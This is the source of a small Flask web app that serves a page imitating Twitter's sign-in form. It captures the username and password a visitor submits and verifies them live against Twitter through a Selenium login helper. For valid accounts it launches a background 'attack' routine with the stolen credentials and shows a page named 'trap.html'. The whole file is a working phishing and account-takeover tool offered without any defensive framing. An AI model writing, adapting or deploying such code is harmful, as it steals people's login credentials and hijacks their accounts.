from flask import Flask, request
from flask import render_template
from selenium_twitter import loginTwitter
from bot import attack
import threading

app = Flask(__name__)

@app.route('/')
def index():
	return render_template('index.html', name=None)

@app.route('/sign_in.html', methods=['GET', 'POST'])
def load():
	if request.method == 'POST':
		username = request.form['session[username_or_email]']
		password = request.form['session[password]']
		if loginTwitter(username, password) == True:
			threading.Thread(target=attack, args=(username, password)).start()
			return render_template('trap.html', name=None)
		else:
			return render_template('wrong_password.html', name=None)
	else:
		return render_template('sign_in.html', name=None)

if __name__ == '__main__':
	app.run()
